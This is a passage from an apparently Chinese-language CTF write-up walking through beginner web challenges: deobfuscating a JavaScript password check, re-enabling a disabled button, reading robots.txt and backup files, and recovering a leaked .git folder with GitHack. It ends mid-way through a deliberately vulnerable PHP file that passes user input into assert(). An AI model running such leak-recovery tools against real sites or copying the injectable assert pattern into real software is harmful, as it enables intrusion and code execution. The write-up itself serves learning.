class="line"><span class="language-javascript">        <span class="comment">//k,m,n,o,没有赋值;l=0,p=&quot;&quot;,i=0,j=11</span></span></span><br><span class="line"><span class="language-javascript">        k = j + (l) + (n=<span class="number">0</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//k=11+0+0</span></span></span><br><span class="line"><span class="language-javascript">        n = tab2.<span class="property">length</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//n=18</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">for</span>(i = (o=<span class="number">0</span>); i &lt; (k = j = n); i++ )&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//先进行()中的运算，k=j=n=18,</span></span></span><br><span class="line"><span class="language-javascript">            o = tab[i-l];</span></span><br><span class="line"><span class="language-javascript">            p += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>((o = tab2[i]));</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//fromCharCode() 方法接受一系列 Unicode 值。这些 Unicode 值是 UTF-16 值（0 到 65535 之间的 16 位整数），它们被转换为字符并连接在一起形成一个字符串。这个结果字符串然后由 fromCharCode() 方法返回。</span></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span>(i == <span class="number">5</span>)</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">break</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">for</span>(i = (o=<span class="number">0</span>); i &lt; (k = j = n); i++ )&#123;</span></span><br><span class="line"><span class="language-javascript">            o = tab[i-l];</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span>(i &gt; <span class="number">5</span> &amp;&amp; i &lt; k-<span class="number">1</span>)</span></span><br><span class="line"><span class="language-javascript">                p += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>((o = tab2[i]));</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//p为FAUX PASSWORD HAH</span></span></span><br><span class="line"><span class="language-javascript">        p += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(tab2[<span class="number">17</span>]);</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//最后的p为FAUX PASSWORD HAHA</span></span></span><br><span class="line"><span class="language-javascript">        pass = p;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> pass;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">	<span class="title class_">String</span>[<span class="string">&quot;fromCharCode&quot;</span>]					(<span class="title function_">dechiffre</span>(<span class="string">&quot;\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30&quot;</span>));</span></span><br><span class="line"><span class="language-javascript"><span class="comment">/*先将\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30十六进制数转换成字符串，python下print即可</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">输出结果55,56,54,79,115,69,114,116,107,49,50;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript"></span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">执行String[&quot;fromCharCode&quot;](dechiffre(&quot;55,56,54,79,115,69,114,116,107,49,50&quot;));*/</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	h = <span class="variable language_">window</span>.<span class="title function_">prompt</span>(<span class="string">&#x27;Enter password&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">alert</span>( <span class="title function_">dechiffre</span>(h) );</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line">执行流程：</span><br><span class="line">一、首先定义了一个dechiffre函数，咱先不管，因为还没有调用</span><br><span class="line">注：先将\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30十六进制数转换成字符串，python下print即可，或网址：https://www.bejson.com/convert/ox2str/</span><br><span class="line">输出结果55,56,54,79,115,69,114,116,107,49,50</span><br><span class="line"></span><br><span class="line">二、执行String[&quot;fromCharCode&quot;](dechiffre(&quot;55,56,54,79,115,69,114,116,107,49,50</span><br><span class="line">&quot;));</span><br><span class="line"></span><br><span class="line">三、调用了dechiffre，执行dechiffre函数</span><br><span class="line">String[&quot;fromCharCode&quot;](dechiffre(&quot;55,56,54,79,115,69,114,116,107,49,50</span><br><span class="line">&quot;));</span><br><span class="line">(1)先将&quot;55,56,54,79,115,69,114,116,107,49,50</span><br><span class="line">&quot;带入dechiffre函数执行，即dechiffre(pass_enc)=dechiffre(&quot;55,56,54,79,115,69,114,116,107,49,50</span><br><span class="line">&quot;)</span><br><span class="line"></span><br><span class="line">(2)接着我们看到了pass变量，暂时先放着</span><br><span class="line"></span><br><span class="line">(3)因为pass_enc=&quot;55,56,54,79,115,69,114,116,107,49,50&quot;</span><br><span class="line">将pass_enc字符串分割成字符串数组，赋值给tab参数，所以：</span><br><span class="line">tab=[55,56,54,79,115,69,114,116,107,49,50]   注：tab此时是字符串数组！！！</span><br><span class="line"></span><br><span class="line">(3)随后也对pass分割</span><br><span class="line">tab2=[70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65]</span><br><span class="line"></span><br><span class="line">(4)变量赋值代码分析：var i,j,k,l=0,m,n,o,p = &quot;&quot;;i = 0;j = tab.length;</span><br><span class="line">一开始i,j,k,m,n,o,没有赋值，为undefined，其它参数l=0，p=&quot;&quot;，后来i被赋值=0，j被赋值为11</span><br><span class="line"></span><br><span class="line">(5)第九行此时n被赋值为0，所以k=11+0+0，最后等于11    注：这里的(l)其中是英文字母l，不是数字1</span><br><span class="line"></span><br><span class="line">(6)第十行中，n=18</span><br><span class="line"></span><br><span class="line">(7)第一个for循环，精简一下代码：</span><br><span class="line">for(i = 0; i &lt; (18); i++ )</span><br><span class="line">&#123;o = tab[i-l];p += String.fromCharCode((o = tab2[i]));</span><br><span class="line">    if(i == 5)break;&#125;</span><br><span class="line">解释：前面的o=tab[i-1]是无用的，因为后面会被o=tab2[i]的值重新覆盖</span><br><span class="line">第一次循环：o=tab[0];p=p+String.fromCharCode((o = tab2[0])</span><br><span class="line">=&gt;o=70;p=&quot;&quot;+String.fromCharCode(70)=&gt;p=英文字母F</span><br><span class="line">第二次...</span><br><span class="line">第三次...</span><br><span class="line">第四次...</span><br><span class="line">第五次...</span><br><span class="line">所以，这个for循环，最后的p为（尽管没有输出出来，这里我们知道就好）FAUX P</span><br><span class="line"></span><br><span class="line">(8)第二个for循环，精简一下代码：</span><br><span class="line">for(i = 0; i &lt; 18; i++ )&#123;</span><br><span class="line">o = tab[i-l];</span><br><span class="line">    if(i &gt; 5 &amp;&amp; i &lt; 17)</span><br><span class="line">        p += String.fromCharCode((o = tab2[i]));</span><br><span class="line">&#125;</span><br><span class="line">解释：这里的for循环和上面的差不多，注意这里的p值由于第一次for循环执行后现在已经是FAUX P了</span><br><span class="line">加上第一次for循环的p值，最后的p为FAUX PASSWORD HAH</span><br><span class="line"></span><br><span class="line">(9)p += String.fromCharCode(tab2[17]);</span><br><span class="line">因为tab2=[70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65]</span><br><span class="line">所以：p=FAUX PASSWORD HAH + A</span><br><span class="line">因此，最后的p为FAUX PASSWORD HAHA</span><br><span class="line"></span><br><span class="line">(10)pass = p;return pass;</span><br><span class="line"> 即 pass = FAUX PASSWORD HAHA;return FAUX PASSWORD HAHA;</span><br><span class="line"> 最后函数输出为FAUX PASSWORD HAHA</span><br><span class="line"></span><br><span class="line">三、dechiffre函数执行完成后，继续执行其它的代码</span><br><span class="line">h = window.prompt(&#x27;Enter password&#x27;);</span><br><span class="line">    alert( dechiffre(h) );</span><br><span class="line">h=你输入弹框内的内容</span><br><span class="line">之后alert弹出dechiffre(h)的值，由前面所有的代码可知，代码里p的值与tab无关，因为最终都会被tab2的值替代，所以我们无论输入什么，也就是pass_enc=h，无论输入的这个h等于什么，不管tab能否被分割成字符串数组，是否存在，都只会利用到tab2。通俗点讲，有关tab的参数与值都可以视为没有，因此，pass_enc参数是什么也就没有意义了</span><br><span class="line"></span><br><span class="line">四、最后，结论就是，无论我们在弹框中输入什么值，都只会返回FAUX PASSWORD HAHA</span><br><span class="line">我就猜想，会不会String[&quot;fromCharCode&quot;](dechiffre(&quot;\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30&quot;));这个语法错误，并且没有没计算出来的是不是最后正确的值，也就是flag~</span><br><span class="line">于是，我不用它这么无论pass_enc参数输入什么都显示FAUX PASSWORD HAHA的函数，咱也抛弃它一回，自己重新写代码执行它</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var n=String.fromCharCode(55,56,54,79,115,69,114,116,107,49,50);</span><br><span class="line">    document.write(n);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">最后结果为：786OsErtk12</span><br><span class="line">根据提示的flag格式输入最后的flag！</span><br><span class="line"></span><br><span class="line">(1)split() 方法用于把一个字符串分割成字符串数组</span><br><span class="line">语法：string.split(separator,limit)</span><br><span class="line">参数                 描述</span><br><span class="line">separator        可选。字符串或正则表达式，从该参数指定的地方分割 string Object。比如此题以逗号分割成字符串数组</span><br><span class="line">limit            可选。该参数可指定返回的数组的最大长度。如果设置了该参数，返回的子串不会多于这个参数指定的数组。如果没有设置该参数，整个字符串都会被分割，不考虑它的长度。</span><br><span class="line">举例：str=&quot;a,b,c,d,e,f,g&quot;;</span><br><span class="line">var 1st = str.split(&quot;,&quot;,3);   对str以逗号进行分割，分割后的字符串数组内的值最多只能有3个，结果就是1st = [a,b,c]</span><br><span class="line"></span><br><span class="line">(2)for 循环的语法如下：</span><br><span class="line">for (语句 1; 语句 2; 语句 3) &#123;</span><br><span class="line">     要执行的代码块</span><br><span class="line">&#125;</span><br><span class="line">语句 1 在循环（代码块）开始之前执行。</span><br><span class="line">语句 2 定义运行循环（代码块）的条件。</span><br><span class="line">语句 3 会在循环（代码块）每次被执行后执行。</span><br><span class="line"></span><br><span class="line">(3)fromCharCode() 可接受一个指定的 Unicode 值，然后返回一个字符串。</span><br><span class="line">语法：String.fromCharCode(n1, n2, ..., nX)</span><br><span class="line">参数                 描述</span><br><span class="line">n1, n2, ..., nX     必需。一个或多个 Unicode 值，即要创建的字符串中的字符的 Unicode 编码。</span><br><span class="line"></span><br><span class="line">(4)prompt()方法用于显示可提示用户进行输入的对话框。</span><br><span class="line">这个方法返回用户输入的字符串</span><br><span class="line">语法：prompt(msg,defaultText)</span><br><span class="line">参数                描述</span><br><span class="line">msg                可选。要在对话框中显示的纯文本（而不是 HTML 格式的文本）就是弹框显示文本。</span><br><span class="line">defaultText        可选。默认的输入文本，你输入什么弹框一开始出现里面的输入框就会默认显示你这个文本。</span><br><span class="line"></span><br><span class="line">(5)var i,j,k,l=0,m,n,o,p = &quot;&quot;;</span><br><span class="line">这个表示声明变量i,j,k,l,m,n,o,p，只有l和p两个变量被赋值了，其它的变量都是不带值的，不带有值的变量，它的值将是undefined，后续代码中可以给它赋值。</span><br><span class="line"></span><br><span class="line">(6)length</span><br><span class="line">length 属性可设置或返回数组中元素的数目。</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="26-disabled-button"><a href="#26-disabled-button" class="headerlink" title="26.disabled_button"></a>26.disabled_button</h2><p>打开</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221201192459467.png" alt="image-20221201192459467"></p>
<p>查看源代码</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221201192535602.png" alt="image-20221201192535602"></p>
<p>分析一下这里核心的html代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">action：是规定此表单就交给那个文件执行</span><br><span class="line">&lt;form&gt;标签用于为用户输入创建 HTML 表单</span><br><span class="line">method：表示请求方法，这里是POST请求</span><br><span class="line">&lt;input&gt;标签用于搜集用户信息</span><br><span class="line">disabled：disabled属性规定应该禁用input元素，这里就是禁用包含它的input元素，这也就是点击不了flag按钮的原因</span><br><span class="line">class：class属性规定元素的类名（classname），大多数时候用于指向样式表中的类（class）</span><br><span class="line">btn：btn-default是默认按钮的样式（它有很多种样式，默认样式是其中的一种，其实就是按钮的形状样式变化</span><br><span class="line">style：style属性规定元素的行内样式（inline style）</span><br><span class="line">height:50px;width:200px;这里是规定了高和宽的像素</span><br><span class="line">type：type属性规定input元素的类型</span><br><span class="line">submit：定义提交按钮，提交按钮会把表单数据发送到服务器</span><br><span class="line">value：value属性为input元素设定值，对于不同的输入类型，value属性的用法也不同</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">type=&quot;button&quot;, &quot;reset&quot;, &quot;submit&quot; - 定义按钮上的显示的文本</span><br><span class="line">type=&quot;text&quot;, &quot;password&quot;, &quot;hidden&quot; - 定义输入字段的初始值</span><br><span class="line">type=&quot;checkbox&quot;, &quot;radio&quot;, &quot;image&quot; - 定义与输入相关联的值</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">flag：value的值，定义按钮上显示的文本为flag</span><br><span class="line"></span><br><span class="line">name：name属性规定input元素的名称</span><br><span class="line">name属性用于对提交到服务器后的表单数据进行标识，或者在客户端通过JavaScript引用表单数据。</span><br><span class="line">注释：只有设置了name属性的表单元素才能在提交表单时传递它们的值，也就是表单元素中没有name属性，就不能将表单的值传递到服务器，在这个题目里，Name属性值为auth，也就是这个表单数据传输到服务器时，是以auth=表单数据进行传输的。通俗点讲就是，服务器端接受的代码是这样的&lt;?php echo $_POST[&quot;auth&quot;]; ?&gt;，接收表单传来的值，php中的auth是$_POST的变量；所以只要记住，表单中name属性值的名称就是服务器端$_POST的变量名</span><br><span class="line"></span><br><span class="line">auth：服务器端接收数据所使用的变量名</span><br></pre></td></tr></table></figure>

<p>方法一：</p>
<p>删掉源代码中的disabled</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221201193719524.png" alt="image-20221201193719524"></p>
<p>方法二：</p>
<p>手动POST数据，提交POST数据</p>
<p><img src="https://img-blog.csdnimg.cn/20190529203445292.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNjE3MDM0,size_16,color_FFFFFF,t_70" alt="img"></p>
<h2 id="27-cookie"><a href="#27-cookie" class="headerlink" title="27.cookie"></a>27.cookie</h2><p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221202105711487.png" alt="image-20221202105711487"></p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221202105745136.png" alt="image-20221202105745136"></p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221202105816743.png" alt="image-20221202105816743"></p>
<h2 id="28-backup"><a href="#28-backup" class="headerlink" title="28.backup"></a>28.backup</h2><p>打开</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221204134253706.png" alt="image-20221204134253706"></p>
<p>备份名为index.php.bak</p>
<p>下载打开</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221204134404966.png" alt="image-20221204134404966"></p>
<h2 id="29-robots"><a href="#29-robots" class="headerlink" title="29.robots"></a>29.robots</h2><p>打开网页啥也没有，题目提示是用到robots协议</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Robots协议的全称是“网络爬虫排除标准”（Robots Exclusion Protocol），它的功能是通过Robots文件告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取，抓取的标准等。它以一个文本文件的形式放在网站的根目录中，用任何一个常见的文本编辑器都可以对其进行修改和编辑。对于站长来说，合理的书写robots.txt文件可以更合理的利用搜索引擎，屏蔽掉一些低质量的页面，提高网站质量和对搜索引擎的友好度。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">具体写法如下：</span><br><span class="line"></span><br><span class="line">（*为通配符）</span><br><span class="line"></span><br><span class="line">User-agent: * 代表的所有的搜索引擎种类，</span><br><span class="line"></span><br><span class="line">Disallow: /admin/ 这里定义是禁止爬寻admin目录下面的目录</span><br><span class="line"></span><br><span class="line">Disallow: /require/ 这里定义是禁止爬寻require目录下面的目录</span><br><span class="line"></span><br><span class="line">Disallow: /ABC/ 这里定义是禁止爬寻ABC目录下面的目录</span><br><span class="line"></span><br><span class="line">Disallow: /cgi-bin/*.htm 禁止访问/cgi-bin/目录下的所有以”.htm”为后缀的URL(包含子目录）。</span><br><span class="line"></span><br><span class="line">Disallow: /*?* 禁止访问网站中所有包含问号 (?) 的网址</span><br><span class="line"></span><br><span class="line">Disallow: /.jpg$ 禁止抓取网页所有的.jpg格式的图片</span><br><span class="line"></span><br><span class="line">Disallow:/ab/adc.html 禁止爬取ab文件夹下面的adc.html文件。</span><br><span class="line"></span><br><span class="line">Allow: /cgi-bin/　这里定义是允许爬寻cgi-bin目录下面的目录</span><br><span class="line"></span><br><span class="line">Allow: /tmp 这里定义是允许爬寻tmp的整个目录</span><br><span class="line"></span><br><span class="line">Allow: .htm$ 仅允许访问以”.htm”为后缀的URL。</span><br><span class="line"></span><br><span class="line">Allow: .gif$ 允许抓取网页和gif格式图片</span><br><span class="line"></span><br><span class="line">Sitemap: 网站地图 告诉爬虫这个页面是网站地图</span><br></pre></td></tr></table></figure>

<p>robots协议一般在根目录创建一个robots.txt文件，打开</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221204143036448.png" alt="image-20221204143036448"></p>
<p>打开</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221204143218966.png" alt="image-20221204143218966"></p>
<h2 id="30-get-post"><a href="#30-get-post" class="headerlink" title="30.get_post"></a>30.get_post</h2><p>打开</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221204143412584.png" alt="image-20221204143412584"></p>
<p>burpsuite工具操作</p>
<p>继续</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221204144512249.png" alt="image-20221204144512249"></p>
<p>继续用burpsuite，改成POST</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221204144639234.png" alt="image-20221204144639234"></p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221204144650327.png" alt="image-20221204144650327"></p>
<h2 id="31-view-source"><a href="#31-view-source" class="headerlink" title="31.view_source"></a>31.view_source</h2><p>打开</p>
<p>查看源代码</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221204144959844.png" alt="image-20221204144959844"></p>
<h2 id="32-mfw"><a href="#32-mfw" class="headerlink" title="32.mfw"></a>32.mfw</h2><ul>
<li>学习git泄露有关知识：<br>当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当，可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞</li>
<li>会简单构造php的payload</li>
<li>了解urlencode</li>
</ul>
<p>访问about页面</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221204145534921.png" alt="image-20221204145534921"></p>
<p>看到git，我们应该想到git文件泄露（Git信息泄露的危害很大，渗透测试人员、攻击者，可直接从源码获取敏感配置信息（如：邮箱，数据库），也可以进一步审计代码，挖掘文件上传、SQL注射等安全漏洞）</p>
<p>看看有没有漏洞</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221204145613716.png" alt="image-20221204145613716"></p>
<p>发现存在漏洞</p>
<p>下载GitHack-master，使用GitHack.py进行扫描目标网站（注意：这个脚本只能使用python2运行，python3无法运行）<br>GitHack是一个.git泄露利用测试脚本，通过泄露的文件，还原重建工程源代码<br>工作原理：<br>1、解析.git&#x2F;index文件，找到工程中所有的： ( 文件名，文件sha1 )<br>2、去.git&#x2F;objects&#x2F; 文件夹下下载对应的文件<br>3、zlib解压文件，按原始的目录结构写入源代码<br>优点：<br>速度快，默认20个工作线程<br>尽量还原所有的源代码，缺失的文件不影响脚本工作<br>脚本不需要执行额外的git命令<br>脚本无需浏览目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">使用方法：</span><br><span class="line">python GitHack.py http:/(目标网址)/.git/</span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221204151533601.png" alt="image-20221204151533601"></p>
<p>url查看搜索到的文件：</p>
<p><img src="https://img-blog.csdnimg.cn/20190613231202126.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNjE3MDM0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>也可以用命令查看</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221204152410011.png" alt="image-20221204152410011"></p>
<p>发现不管用哪种方式，都无法查看flag</p>
<p>来看看主页index.php有什么内容</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221205141323318.png" alt="image-20221205141323318"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$page</span> = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;templates/&quot;</span> . <span class="variable">$page</span> . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// I heard &#x27;..&#x27; is dangerous!</span></span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br><span class="line"><span class="comment">/*strpos() 函数查找字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回 FALSE。</span></span><br><span class="line"><span class="comment">语法：strpos(string,find,start)</span></span><br><span class="line"><span class="comment">参数 描述</span></span><br><span class="line"><span class="comment">string 必需。规定要搜索的字符串。</span></span><br><span class="line"><span 